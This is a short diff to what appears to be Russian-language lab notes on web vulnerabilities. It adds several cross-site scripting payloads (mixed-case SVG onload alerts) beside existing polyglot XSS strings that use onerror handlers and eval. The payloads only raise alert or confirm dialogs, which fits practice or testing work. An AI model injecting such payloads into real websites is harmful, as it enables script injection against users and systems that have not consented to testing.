@@ -133,9 +133,13 @@ Command Execution: уровень 4
 
 '">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)>
 
-
 <img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id)>'">
 
+<SvG/oNloAd=alert(/w4piesy3nm/)>
+
+some_important_info
+
+<SvG/oNloAd=alert(some_important_info.txt)>
 
 ![image](https://github.com/user-attachments/assets/3092edf7-eacf-44ef-9b63-c685cb6f04ae)
 
